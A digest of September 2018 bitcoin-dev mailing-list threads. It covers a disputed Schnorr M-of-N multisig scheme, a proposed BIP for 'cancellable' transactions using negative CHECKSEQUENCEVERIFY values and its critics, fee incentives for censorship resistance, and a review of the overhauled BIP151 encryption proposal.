	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<20180905130559.GH18522@boulet.lan>
Message-ID: <CAJowKgKOu2G37dkhyKGhFJswhq_D0N0Bz4YPiBFjWTNhGWZFCg@mail.gmail.com>

Correct, there is an interaction step to deduce G*k, when signing, each
participant has to publishes G*ki. I didn't talk about it.   That doesn't
break it, but you're correct, it's not non-interactive.

On Wed, Sep 5, 2018 at 9:06 AM Andrew Poelstra <apoelstra at wpsoftware.net>
wrote:

> On Wed, Sep 05, 2018 at 08:26:14AM -0400, Erik Aronesty wrote:
> > Why would you call it FUD?   All the weird hemming and hawing about it is
> > really strange to me.  The more I look into it and speak to professors
> > about i, the more it seems "so trivial nobody really talks about it".
> >
> > 1. Generate an M of N shared public key (done in advance of signing ....
> > this gets you the bitcoin address)
> > 2. Generate signature fragments (this can be done offline, with no
> > communication between participants)
> >
> > Detailed explanation with code snippets:
> >
> >
> https://medium.com/@simulx/an-m-of-n-bitcoin-multisig-scheme-e7860ab34e7f
> >
>
> The hemming and hawing is because you've been repeatedly told that your
> scheme doesn't work, and to please implement it in some computer algebra
> system so that you can see that (or so we can see where your mistake is),
> and you instead continue to post incomplete/incoherent copies of the same
> thing across multiple mediums - Reddit, this list, Bitcointalk, Medium,
> etc ad nauseum.
>
> It's distracting and offensive to people who have spent a lot of time and
> energy thinking about this stuff, and more importantly it causes confusion
> in the public eye. Phrasings like "weird hemming and hawing" suggest that
> we don't know/don't care about some insight you have, which is not true.
> This is why your posts are FUD.
>
> For example, in your linked post I looked at every single instance of the
> character 'k' and *not one of them* defined the value 'k' from which 'R'
> is derived in the signing procedure.
>
>
> Of course there is no possible value, individual signers cannot learn 'R'
> at signing time without interaction, and your whole scheme is broken. Given
> the number of times you've been told this, I find it hard to believe that
> this was an honest mistake.
>
>
>
> Andrew
>
>
>
> --
> Andrew Poelstra
> Research Director, Mathematics Department, Blockstream
> Email: apoelstra at wpsoftware.net
> Web:   https://www.wpsoftware.net/andrew
>
> "Make it stop, my love; we were wrong to try
>  Never saw what we could unravel in traveling light
>  Nor how the trip debrides like a stack of slides
>  All we saw was that time is taller than space is wide"
>        --Joanna Newsom
>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180905/c737fbbf/attachment-0001.html>

From a.ranchalpedrosa at gmail.com  Thu Sep  6 09:19:24 2018
From: a.ranchalpedrosa at gmail.com (Alejandro Ranchal Pedrosa)
Date: Thu, 6 Sep 2018 11:19:24 +0200
Subject: [bitcoin-dev] A BIP proposal for transactions that are 'cancellable'
Message-ID: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>

Hello everyone,

We would like to propose a new BIP to extend OP_CSV (and/or OP_CLTV) in
order for these to allow and interpret negative values. This way,
taking the example shown in BIP 112:

HASH160 <revokehash> EQUAL
IF
 ??? <Bob's pubkey>
ELSE
 ??? "24h" CHECKSEQUENCEVERIFY DROP
 ??? <Alice's pubkey>
ENDIF
CHECKSIG

that gives ownership only to Bob for the first 24 hours and then to
whichever spends first, we basically propose using the negative bit value:

HASH160 <revokehash> EQUAL
IF
 ??? <Bob's pubkey>
ELSE
 ??? "-24h" CHECKSEQUENCEVERIFY DROP
 ??? <Alice's pubkey>
ENDIF
CHECKSIG

meaning that both would have ownership for the first 24 hours, but
after that only Bob would own such coins. Its implementation should
not be too tedious, and in fact it simply implies considering negative
values that are at the moment discarded as for the specification of
BIP-112, leaving the sign bit unused.

This, we argue, an increase the fairness of the users, and can at times
be more cost-effective for users to do rather than trying a Replace-By-Fee
transaction, should they want to modify such payment.

We would like to have a discussion about this before proposing the
BIP, for which we are preparing the text.

You can find our paper discussing it here:
https://hal-cea.archives-ouvertes.fr/cea-01867357 (find attached as well)

Best,

-- 
Alejandro Ranchal Pedrosa, ?nder G?rcan and Sara Tucci-Piergiovanni

-------------- next part --------------
A non-text attachment was scrubbed...
Name: Gurcan2018. On Cancellation of Transactions in Bitcoin-like Blockchains.pdf
Type: application/pdf
Size: 785407 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180906/187528f6/attachment-0001.pdf>

From greg at xiph.org  Wed Sep  5 15:35:14 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Wed, 5 Sep 2018 15:35:14 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
	<2e620d305c86f65cbff44b5fba548dc85c118f84.camel@timruffing.de>
	<20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
Message-ID: <CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>

On Wed, Sep 5, 2018 at 1:49 PM Erik Aronesty via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
> Detailed explanation with code snippets:
>
> https://medium.com/@simulx/an-m-of-n-bitcoin-multisig-scheme-[snip]

This appears to be a repost of the broken scheme you posted about on
Bitcointalk, but then failed to respond to the response.

https://bitcointalk.org/index.php?topic=4973123.0

> The more I look into it and speak to professors about i, the more it seems "so trivial nobody really talks about it".

I think you might be falling into the trap of ignoring feedback you
don't like and and accepting that which sounds like "yea yea,
something like that".

Something "like that" does work: and is expressly and explicitly
anticipated by the BIP but to be both secure and functional requires
proper delineation (E.g. musig) _and_ interaction. What you're
proposing is continually vague.  My best efforts at making sense of
what you've written indicate that either it's non-interactive and
not-actually functional at all,  OR it's interactive and just a less
secure subset (no proper delinearization to prevent rogue key attacks)
of what we already propose.

When Poelstra suggests a CAS implementation he means something like
this Sage notebook: http://bitcoin.ninja/secp256k1.ecdsa.sage  This
provides for a method of communicating in both directions which is
completely precise.

From willtech at live.com.au  Thu Sep  6 08:48:34 2018
From: willtech at live.com.au (Damian Williamson)
Date: Thu, 6 Sep 2018 08:48:34 +0000
Subject: [bitcoin-dev] Guiding transaction fees towards a more
	censorship	resistant outcome
In-Reply-To: <CAPv7TjbnsqHwW=Oj7n_WJFR4vp1ND78NgV0=Ftj5doNuKOxLCg@mail.gmail.com>
References: <CAPv7TjbnsqHwW=Oj7n_WJFR4vp1ND78NgV0=Ftj5doNuKOxLCg@mail.gmail.com>
Message-ID: <PS2P216MB0179E804329D495A4EE6F4EC9D010@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>

Humour me please,


Where you say "create transactions which are only valid if they are mined on top of a specific block." - in practice, does that usually means at any height above a specific block?

________________________________
From: bitcoin-dev-bounces at lists.linuxfoundation.org <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Ruben Somsen via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
Sent: Sunday, 2 September 2018 3:26:54 AM
To: bitcoin-dev at lists.linuxfoundation.org
Subject: [bitcoin-dev] Guiding transaction fees towards a more censorship resistant outcome

When a user creates a transaction with a fee attached, they are
incentivizing miners to add this transaction to the blockchain. The
task is usually not very specific -- as long as it ends up in a valid
chain with the most Proof-of-Work, miners get paid. The payment is an
incentive for miners to act in the way that users desire.

To the user, there?s an individual benefit: their transaction gets
added. To the network, there?s a shared benefit: all fees add to the
security of other transactions in the chain. Miners can choose to
ignore the incentives, but they would be leaving money on the table
(and eventually get replaced by more competitive miners).

Transactions from Bitcoin Core are slightly more specific about what
they ask miners to do. Every transaction is only valid at a block
height that is one higher than the last block. This incentivizes
miners to build on top of the last block, instead of going back and
reorganizing the blockchain. This is especially important in a future
scenario where the fee reward is larger than the block reward.

BIP 115* by Luke-jr is even more specific. It enables users to create
transactions which are only valid if they are mined on top of a
specific block. While originally designed as a form of replay
protection, it actually serves as a deterrent for miners to reorganize
the blockchain. If they orphan a block, it will invalidate
transactions that demanded the inclusion of the orphaned block. This
increases the cost of intentionally reorganizing the blockchain.

Coinjoin**, the act of combining payments of multiple users into a
single transaction, can be seen as yet another method for users to be
more specific. The fate of their payments are now intertwined with
that of others. If miners wish to censor a single payment, they have
to reject the entire transaction, and the associated fee amount.
Techniques like mimblewimble simplify this process, by making coinjoin
non-interactive.

This brings us to a theoretical scenario where:

- every block contains only a single coinjoin transaction
- the validity of this transaction depends on the inclusion of a
specific previous block
- the block reward is negligible compared to transaction fees

In this scenario, if miners wish to undo a specific transaction that
happened two blocks ago, they would have to create three empty blocks
(receiving negligible compensation) in order to overtake the longest
chain. And even then, users can still refuse to let their new
transactions be mined on top of the empty blocks, disincentivizing
such behavior completely.

While not easy to achieve in practice (e.g. resolving natural forks
becomes more complicated), it demonstrates that users can become more
empowered than they are today, benefitting censorship resistance***.
It is this line of thinking that I wish to convey. Perhaps it may
inspire further ideas in this direction.

-- Ruben Somsen


* BIP 115: https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Fbitcoin%2Fbips%2Fblob%2Fmaster%2Fbip-0115.mediawiki&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=req4KYOcztXLAG%2Fu4RrmhLREGBF28JNTe45pO86kRd4%3D&amp;reserved=0

** Coinjoin: https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbitcointalk.org%2Findex.php%3Ftopic%3D279249.0&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=d%2B06jxrKubWhLwoInFEgo8eHvI9f1j74QN8WH7xrVos%3D&amp;reserved=0

*** Risk sharing principle:
https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Flibbitcoin%2Flibbitcoin%2Fwiki%2FRisk-Sharing-Principle&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=NA3HxqI5PnuyaI9hyCaw0rcaFsrhD%2FXQB8biWJXej8g%3D&amp;reserved=0
_______________________________________________
bitcoin-dev mailing list
bitcoin-dev at lists.linuxfoundation.org
https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Flists.linuxfoundation.org%2Fmailman%2Flistinfo%2Fbitcoin-dev&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=9P7UetPmKWngjgjNPE0%2BAMgdzuL2DgqBLoLti82f23M%3D&amp;reserved=0
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180906/43a9fa13/attachment.html>

From greg at xiph.org  Thu Sep  6 15:16:34 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Thu, 6 Sep 2018 15:16:34 +0000
Subject: [bitcoin-dev] A BIP proposal for transactions that are
	'cancellable'
In-Reply-To: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
Message-ID: <CAAS2fgQqer6nMXXdcuoXE8UyJokuLTTLBwT+w0tH2+BA2gDu0w@mail.gmail.com>

Functionality such as this does not currently exist not because no one
thought of it before, but because it has been proposed many times
before and determined to be harmful.  The existing design of CLTV/CSV
were carefully constructed to make it impossible for a transaction to
go from valid to invalid based on the time. The most naive
construction-- e.g. push the current time/height on the stack-- would
have that property and was specifically avoided.

When a spend goes from valid to invalid it means that a reorganization
will destroy coins even completely absent any dishonest actions of the
coins prior owner in the coins recent casual history. Effectively a
coin with any kind of non-monotone validity event in its recent
history functions like a recently generated coin: a coin that reorgs
destroy. Bitcoin addresses the issue for recently generated coins by
not permitting their use for 100 blocks.  I've yet to see an argument
for a use case for non-monotone validity that still sounds useful once
the negative effects are addressed (e.g. by subjecting coins that have
gone through them to a maturity limitation).

From lf-lists at mattcorallo.com  Thu Sep  6 13:31:58 2018
From: lf-lists at mattcorallo.com (Matt Corallo)
Date: Thu, 06 Sep 2018 13:31:58 +0000
Subject: [bitcoin-dev] A BIP proposal for transactions that are
	'cancellable'
In-Reply-To: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
Message-ID: <8CA4E834-061C-4EE9-A69D-CAE69A08FE7D@mattcorallo.com>

I think a simple approach to what you want to accomplish is to simply have a multisig option with a locktime pre-signed transaction which is broadcastable at the 24h mark and has different spendability. This avoids introducing reorg-induced invalidity.

On September 6, 2018 9:19:24 AM UTC, Alejandro Ranchal Pedrosa via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:
>Hello everyone,
>
>We would like to propose a new BIP to extend OP_CSV (and/or OP_CLTV) in
>order for these to allow and interpret negative values. This way,
>taking the example shown in BIP 112:
>
>HASH160 <revokehash> EQUAL
>IF
> ??? <Bob's pubkey>
>ELSE
> ??? "24h" CHECKSEQUENCEVERIFY DROP
> ??? <Alice's pubkey>
>ENDIF
>CHECKSIG
>
>that gives ownership only to Bob for the first 24 hours and then to
>whichever spends first, we basically propose using the negative bit
>value:
>
>HASH160 <revokehash> EQUAL
>IF
> ??? <Bob's pubkey>
>ELSE
> ??? "-24h" CHECKSEQUENCEVERIFY DROP
> ??? <Alice's pubkey>
>ENDIF
>CHECKSIG
>
>meaning that both would have ownership for the first 24 hours, but
>after that only Bob would own such coins. Its implementation should
>not be too tedious, and in fact it simply implies considering negative
>values that are at the moment discarded as for the specification of
>BIP-112, leaving the sign bit unused.
>
>This, we argue, an increase the fairness of the users, and can at times
>be more cost-effective for users to do rather than trying a
>Replace-By-Fee
>transaction, should they want to modify such payment.
>
>We would like to have a discussion about this before proposing the
>BIP, for which we are preparing the text.
>
>You can find our paper discussing it here:
>https://hal-cea.archives-ouvertes.fr/cea-01867357 (find attached as
>well)
>
>Best,
>
>-- 
>Alejandro Ranchal Pedrosa, ?nder G?rcan and Sara Tucci-Piergiovanni
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180906/4ff7a84e/attachment-0001.html>

From vizeet at gmail.com  Thu Sep  6 16:14:59 2018
From: vizeet at gmail.com (vizeet srivastava)
Date: Thu, 6 Sep 2018 21:44:59 +0530
Subject: [bitcoin-dev] A BIP proposal for transactions that are
	'cancellable'
In-Reply-To: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
Message-ID: <CAEmwXH=BZgceLogi+QTA3sLdy8gVFW=wCdt5f9ZS6br=4ktcdg@mail.gmail.com>

I feel it is breaking a principle that if a transaction is valid it remains
valid. There might be dangerous repercussions to breaking that rule. For
instance chain of transaction become invalid which might lead to losses.

On Thu 6 Sep, 2018, 6:37 PM Alejandro Ranchal Pedrosa via bitcoin-dev, <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> Hello everyone,
>
> We would like to propose a new BIP to extend OP_CSV (and/or OP_CLTV) in
> order for these to allow and interpret negative values. This way,
> taking the example shown in BIP 112:
>
> HASH160 <revokehash> EQUAL
> IF
>      <Bob's pubkey>
> ELSE
>      "24h" CHECKSEQUENCEVERIFY DROP
>      <Alice's pubkey>
> ENDIF
> CHECKSIG
>
> that gives ownership only to Bob for the first 24 hours and then to
> whichever spends first, we basically propose using the negative bit value:
>
> HASH160 <revokehash> EQUAL
> IF
>      <Bob's pubkey>
> ELSE
>      "-24h" CHECKSEQUENCEVERIFY DROP
>      <Alice's pubkey>
> ENDIF
> CHECKSIG
>
> meaning that both would have ownership for the first 24 hours, but
> after that only Bob would own such coins. Its implementation should
> not be too tedious, and in fact it simply implies considering negative
> values that are at the moment discarded as for the specification of
> BIP-112, leaving the sign bit unused.
>
> This, we argue, an increase the fairness of the users, and can at times
> be more cost-effective for users to do rather than trying a Replace-By-Fee
> transaction, should they want to modify such payment.
>
> We would like to have a discussion about this before proposing the
> BIP, for which we are preparing the text.
>
> You can find our paper discussing it here:
> https://hal-cea.archives-ouvertes.fr/cea-01867357 (find attached as well)
>
> Best,
>
> --
> Alejandro Ranchal Pedrosa, ?nder G?rcan and Sara Tucci-Piergiovanni
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180906/287712d4/attachment.html>

From rsomsen at gmail.com  Thu Sep  6 17:35:24 2018
From: rsomsen at gmail.com (Ruben Somsen)
Date: Fri, 7 Sep 2018 02:35:24 +0900
Subject: [bitcoin-dev] Guiding transaction fees towards a more
 censorship resistant outcome
In-Reply-To: <PS2P216MB0179E804329D495A4EE6F4EC9D010@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
References: <CAPv7TjbnsqHwW=Oj7n_WJFR4vp1ND78NgV0=Ftj5doNuKOxLCg@mail.gmail.com>
	<PS2P216MB0179E804329D495A4EE6F4EC9D010@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
Message-ID: <CAPv7TjawW9Z0frbjzfWe3y04V7zM1hdmUeJYjNLOtJnWVhZZ0w@mail.gmail.com>

Hi Damian,

>Where you say "create transactions which are only valid if they are mined on top of a specific block." - in practice, does that usually means at any height above a specific block?

Those details aren't important for the point I was trying to make.
BIP115 allows the transaction to be mined at any height, which is
probably as far as you can take this, realistically. What I think
you'll find in practice, is that the more specific you are in how you
want your transaction to be mined, the higher the chance that your
transaction will inadvertently become unmineable.

A perhaps more general point that I realized after posting, is that
fee pressure towards censorship resistance happens naturally if the
system provides anonymity. If the target transaction that miners wish
to censor is indistinguishable from other anonymous transactions, then
miners will have no choice but to censor every anonymous transaction,
so the end result is very similar to what I imagined linking
transactions would do.

-- Ruben Somsen
On Thu, Sep 6, 2018 at 5:48 PM Damian Williamson <willtech at live.com.au> wrote:
>
> Humour me please,
>
>
> Where you say "create transactions which are only valid if they are mined on top of a specific block." - in practice, does that usually means at any height above a specific block?
>
> ________________________________
> From: bitcoin-dev-bounces at lists.linuxfoundation.org <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Ruben Somsen via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
> Sent: Sunday, 2 September 2018 3:26:54 AM
> To: bitcoin-dev at lists.linuxfoundation.org
> Subject: [bitcoin-dev] Guiding transaction fees towards a more censorship resistant outcome
>
> When a user creates a transaction with a fee attached, they are
> incentivizing miners to add this transaction to the blockchain. The
> task is usually not very specific -- as long as it ends up in a valid
> chain with the most Proof-of-Work, miners get paid. The payment is an
> incentive for miners to act in the way that users desire.
>
> To the user, there?s an individual benefit: their transaction gets
> added. To the network, there?s a shared benefit: all fees add to the
> security of other transactions in the chain. Miners can choose to
> ignore the incentives, but they would be leaving money on the table
> (and eventually get replaced by more competitive miners).
>
> Transactions from Bitcoin Core are slightly more specific about what
> they ask miners to do. Every transaction is only valid at a block
> height that is one higher than the last block. This incentivizes
> miners to build on top of the last block, instead of going back and
> reorganizing the blockchain. This is especially important in a future
> scenario where the fee reward is larger than the block reward.
>
> BIP 115* by Luke-jr is even more specific. It enables users to create
> transactions which are only valid if they are mined on top of a
> specific block. While originally designed as a form of replay
> protection, it actually serves as a deterrent for miners to reorganize
> the blockchain. If they orphan a block, it will invalidate
> transactions that demanded the inclusion of the orphaned block. This
> increases the cost of intentionally reorganizing the blockchain.
>
> Coinjoin**, the act of combining payments of multiple users into a
> single transaction, can be seen as yet another method for users to be
> more specific. The fate of their payments are now intertwined with
> that of others. If miners wish to censor a single payment, they have
> to reject the entire transaction, and the associated fee amount.
> Techniques like mimblewimble simplify this process, by making coinjoin
> non-interactive.
>
> This brings us to a theoretical scenario where:
>
> - every block contains only a single coinjoin transaction
> - the validity of this transaction depends on the inclusion of a
> specific previous block
> - the block reward is negligible compared to transaction fees
>
> In this scenario, if miners wish to undo a specific transaction that
> happened two blocks ago, they would have to create three empty blocks
> (receiving negligible compensation) in order to overtake the longest
> chain. And even then, users can still refuse to let their new
> transactions be mined on top of the empty blocks, disincentivizing
> such behavior completely.
>
> While not easy to achieve in practice (e.g. resolving natural forks
> becomes more complicated), it demonstrates that users can become more
> empowered than they are today, benefitting censorship resistance***.
> It is this line of thinking that I wish to convey. Perhaps it may
> inspire further ideas in this direction.
>
> -- Ruben Somsen
>
>
> * BIP 115: https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Fbitcoin%2Fbips%2Fblob%2Fmaster%2Fbip-0115.mediawiki&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=req4KYOcztXLAG%2Fu4RrmhLREGBF28JNTe45pO86kRd4%3D&amp;reserved=0
>
> ** Coinjoin: https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbitcointalk.org%2Findex.php%3Ftopic%3D279249.0&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=d%2B06jxrKubWhLwoInFEgo8eHvI9f1j74QN8WH7xrVos%3D&amp;reserved=0
>
> *** Risk sharing principle:
> https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Flibbitcoin%2Flibbitcoin%2Fwiki%2FRisk-Sharing-Principle&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=NA3HxqI5PnuyaI9hyCaw0rcaFsrhD%2FXQB8biWJXej8g%3D&amp;reserved=0
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://apc01.safelinks.protection.outlook.com/?url=https%3A%2F%2Flists.linuxfoundation.org%2Fmailman%2Flistinfo%2Fbitcoin-dev&amp;data=02%7C01%7C%7C48403f77efc14613e89b08d611f5980c%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C636716143839246019&amp;sdata=9P7UetPmKWngjgjNPE0%2BAMgdzuL2DgqBLoLti82f23M%3D&amp;reserved=0

From lf-lists at mattcorallo.com  Thu Sep  6 16:33:38 2018
From: lf-lists at mattcorallo.com (Matt Corallo)
Date: Thu, 6 Sep 2018 12:33:38 -0400
Subject: [bitcoin-dev] A BIP proposal for transactions that are 'cancellable'
In-Reply-To: <CABaiX-2L9oVdta=aRH91uE=iPRv4cX6zU0=+oF+2oWqnu=64YQ@mail.gmail.com>
References: <3d4162e0-1f8b-0f23-85fc-9d18d4352cae@gmail.com>
	<8CA4E834-061C-4EE9-A69D-CAE69A08FE7D@mattcorallo.com>
	<CABaiX-2L9oVdta=aRH91uE=iPRv4cX6zU0=+oF+2oWqnu=64YQ@mail.gmail.com>
Message-ID: <029a8e95-a265-451d-5417-957d685fa9ce@mattcorallo.com>

I think you misunderstood my proposal. What you'd do is the transaction
is spendable by either Bob OR (Bob AND Alice) and before
broadcast/during construction/whatever sign a new transaction that
spends it and is only spendable by Alice, but is timelocked for 24
hours. At the 24h mark, Alice broadcasts the transaction and once it is
confirmed only Alice can claim the money.

On 09/06/18 10:59, Alejandro Ranchal Pedrosa wrote:
> Dear Matt,
> 
> Notice that what you suggest has some substantial differences. With your
> suggestion of a multisig option with a 24h timelock, once you give Alice
> the chance to spend that UTXO without a negative timelock (as we argue),
> by means of, say, a transaction that she can use, you cannot enforce
> that this is not used by Alice after the 24hs. Perhaps it is possible,
> tweaking the Lightning Channel design of Breach Remedy txs, to penalize
> Alice if she does this, but this requires Bob to check the Blockchain in
> case he needs to publish a proof-of-fraud, think of adding extra funds
> to the transaction to account for penalization, etc.
> 
> Feel free to correct me if I got it wrong in your email.
> 
> Best,
> Alejandro.
> 
> 
> On Thu, Sep 6, 2018 at 3:32 PM Matt Corallo <lf-lists at mattcorallo.com
> <mailto:lf-lists at mattcorallo.com>> wrote:
> 
>     I think a simple approach to what you want to accomplish is to
>     simply have a multisig option with a locktime pre-signed transaction
>     which is broadcastable at the 24h mark and has different
>     spendability. This avoids introducing reorg-induced invalidity.
> 
>     On September 6, 2018 9:19:24 AM UTC, Alejandro Ranchal Pedrosa via
>     bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org
>     <mailto:bitcoin-dev at lists.linuxfoundation.org>> wrote:
> 
>         Hello everyone,
> 
>         We would like to propose a new BIP to extend OP_CSV (and/or OP_CLTV) in
>         order for these to allow and interpret negative values. This way,
>         taking the example shown in BIP 112:
> 
>         HASH160 <revokehash> EQUAL
>         IF
>          ??? <Bob's pubkey>
>         ELSE
>          ??? "24h" CHECKSEQUENCEVERIFY DROP
>          ??? <Alice's pubkey>
>         ENDIF
>         CHECKSIG
> 
>         that gives ownership only to Bob for the first 24 hours and then to
>         whichever spends first, we basically propose using the negative bit value:
> 
>         HASH160 <revokehash> EQUAL
>         IF
>          ??? <Bob's pubkey>
>         ELSE
>          ??? "-24h" CHECKSEQUENCEVERIFY DROP
>          ??? <Alice's pubkey>
>         ENDIF
>         CHECKSIG
> 
>         meaning that both would have ownership for the first 24 hours, but
>         after that only Bob would own such coins. Its implementation should
>         not be too tedious, and in fact it simply implies considering negative
>         values that are at the moment discarded as for the specification of
>         BIP-112, leaving the sign bit unused.
> 
>         This, we argue, an increase the fairness of the users, and can at times
>         be more cost-effective for users to do rather than trying a Replace-By-Fee
>         transaction, should they want to modify such payment.
> 
>         We would like to have a discussion about this before proposing the
>         BIP, for which we are preparing the text.
> 
>         You can find our paper discussing it here:
>         https://hal-cea.archives-ouvertes.fr/cea-01867357 (find attached as well)
> 
>         Best,
> 

From crypto at timruffing.de  Thu Sep  6 23:23:21 2018
From: crypto at timruffing.de (Tim Ruffing)
Date: Fri, 07 Sep 2018 01:23:21 +0200
Subject: [bitcoin-dev] Overhauled BIP151
In-Reply-To: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
References: <640D015D-3DDB-43C4-9752-96ADABF64C91@jonasschnelli.ch>
Message-ID: <061aa38d8ceeb6caaae19d7c86e435a5f86b293b.camel@timruffing.de>

Hi Jonas,

Great to see progress in this area. I have quite a few comments.

Post-quantum key exchange
=========================
I think that's overkill. Bitcoin has huge problems in the presence of a quantum computer, and the
confidentiality of the P2P messages is the most minor one. If there is a quantum computer and
Bitcoin remains in its current form, then people should probably stop using it.

Now you can argue that the attacker is storing encrypted traffic today to decrypt it later. Sure,
but if that's your threat model then Bitcoin is probably not the right tool for you. (And if
you insist that Bitcoin is the right tool, then you can and probably should use it over Tor
anyway.) Given the fact that essentially all information in Bitcoin will be public in some way,
there are probably cheaper attacks (MITM, traffic analysis).

It's not worth the hassle, would hinder adoption, and it has the potential to create a wrong
impression of "bulletproof" security. Even worse, there will be too many people that will suddenly
assume that Bitcoin is post-quantum secure.

Key exchange indistinguishable from random
==========================================
I would rather love to see a simple ECDH key exchange as currently used but with an encoding of
public key that provides indistinguishability from random bitstrings. "Elligator" does not work
but "Elligator Squared" [1] does the job for secp256k1 -- it just doubles the size of the public
key. Together with the encrypted packet lengths, the entire data stream looks like random then,
which is pretty useful against censorship resistance for example. (The only exception is that the
stream will never start with the magic bytes.)

Key derivation
==============
The key derivation can be improved. It should include each peer's understanding of its role,
i.e., requester (or "initiator" is the more common term) or responder. At the moment, an attacker
can create a situation where two peers think they're in the same session (with the same session
id) but they're actually not. Also, it's possible for an attacker to rerandomize the public keys.
That's nothing bad by itself but anything which restricts the flexibility of the attacker without
adding complexity is a good idea. Something like
   "salt = BitcoinSharedSecret||INITIATOR_PUBKEY||RESPONDER_PUBKEY" should just avoid this issue.

Re-keying
=========
The problem with signalling re-keying in the length field is that the length field is not covered
by the MAC. So the attacker can flip the signalling bit. The resulting protocol is probably still
secure but the malleability is certainly not desirable.

Deterministic rekeying rules may be better. Otherwise there will be implementations that rekey
every 10 seconds and implementations that just don't rekey at all (rendering the 10 s rekeying
interval in the opposite direction useless). Different policies also make it possible to
fingerprint implementations. Another problem is that people will set their policies arbitrarily.
What's better: 5 min or 30 min? I don't know, but both are reasonable choices. (Thats's very much
like discussions about ciphers... What's better AES-GCM or ChaCha20/Poly1305? I don't know, but
again both are reasonable choices.)

Symmetric crypto
================
You call it chacha20-poly1305 at bitcoin but what's the difference to the openssh then? Is the
idea to save a call to chacha here as you mentioned?

I didn't think about this in detail: maybe there are a few meaningful cases where padding could
hide the message length without too much overhead. (I'm not convinced, just a random thought.)

Misc
====
"The ID/string mapping is a peer to peer arrangement and MAY be negotiated between the
requesting and responding peer." I think that's overly complicated. I suggest it should just be
written in stone, again to avoid complexity and to avoid fingerprinting. New implementations are
necessary anyway, so maybe just use IDs for anything? ASCII is nice if you want to debug your code
or some random network failure but that's hard anyway when encryption is used.

